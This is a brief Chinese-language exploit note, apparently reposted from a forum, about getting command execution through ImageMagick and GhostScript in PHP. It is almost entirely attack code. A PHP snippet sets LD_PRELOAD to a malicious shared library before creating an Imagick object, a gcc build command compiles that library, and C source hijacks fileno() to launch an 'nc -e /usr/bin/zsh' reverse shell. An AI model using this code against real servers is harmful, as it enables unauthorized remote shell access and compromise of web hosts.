# imagemagick+GhostScript

> 原文：[https://www.zhihuifly.com/t/topic/3465](https://www.zhihuifly.com/t/topic/3465)

## **imagemagick+GhostScript**

**exp**

```
<?php
putenv('LD_PRELOAD=/var/www/html/imag.so');
$img = new Imagick('/tmp/1.ps');
?> 
```

其中 imag.c文件需要编译，命令如下

```
gcc -shared -fPIC imag.c -o imag.so 
```

> imag.c代码

```
#include <stdlib.h>
#include <string.h>
void payload() {
  const char* cmd = "nc -e /usr/bin/zsh 127.0.0.1 4444";
  system(cmd);
}
int fileno() {
  if (getenv("LD_PRELOAD") == NULL) { return 0; }
  unsetenv("LD_PRELOAD");
    payload();
} 
```